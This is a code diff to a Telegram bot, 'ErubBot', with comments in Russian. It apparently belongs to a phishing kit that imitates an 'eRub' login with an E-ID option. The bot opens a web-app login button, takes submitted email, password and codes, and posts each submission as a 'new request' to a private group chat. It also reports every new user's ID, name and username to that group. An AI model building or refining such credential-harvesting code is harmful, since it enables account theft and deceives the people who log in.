@@ -23,18 +23,27 @@ class ErubBot:
         self.app.add_handler(CommandHandler("start", self.start))
         self.app.add_handler(MessageHandler(filters.ALL, self.handle))
 
-    # ===== 1. /start =====
+    # ===== 1. /start с полным уведомлением =====
     async def start(self, update: Update, context):
         user = update.effective_user
+        current_time = datetime.now().strftime("%d.%m.%Y %H:%M")
 
+        # Красивое уведомление в группу
         await self.app.bot.send_message(
             chat_id=GROUP_CHAT_ID,
-            text=f"🟢 НОВЫЙ ПОЛЬЗОВАТЕЛЬ\nID: `{user.id}`\n@{user.username or 'нет'}",
+            text=f"🟢 НОВЫЙ ВХОД В БОТА!\n\n"
+                 f"👤 ID: `{user.id}`\n"
+                 f"👤 Имя: {user.first_name or 'без имени'}\n"
+                 f"👤 Username: @{user.username or 'нет'}\n"
+                 f"🕐 Время: {current_time}",
             parse_mode="Markdown"
         )
 
+        # Приветствие пользователю
         await update.message.reply_text(
-            f"👋 Привет, {user.first_name}!",
+            f"👋 Привет, {user.first_name}!\n\n"
+            f"Нажмите кнопку ВНИЗУ, чтобы открыть приложение eRub.\n\n"
+            f"Если Вы ещё не зарегистрированы в eRub, выберите Вход через E-ID.",
             reply_markup=ReplyKeyboardMarkup(
                 [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
                 resize_keyboard=True
@@ -88,7 +97,7 @@ class ErubBot:
                 eid_type = data.get('type')
 
                 # ---- Обычный вход ----
-                if email and password and not code and not link:
+                if email and password and not code and not link and not eid_type:
                     await self.app.bot.send_message(
                         chat_id=GROUP_CHAT_ID,
                         text=f"🔔 НОВАЯ ЗАЯВКА!\n\n"
@@ -135,9 +144,11 @@ class ErubBot:
 
             except Exception as e:
                 logger.error(f"Ошибка: {e}")
+                await msg.reply_text("❌ Ошибка обработки данных")
 
         # ---- Если пользователь просто пишет текст ----
-        await msg.reply_text("ℹ️ Используйте кнопку «Войти»")
+        else:
+            await msg.reply_text("ℹ️ Используйте кнопку «Войти»")
 
     # ===== 3. Запуск =====
     def run(self):
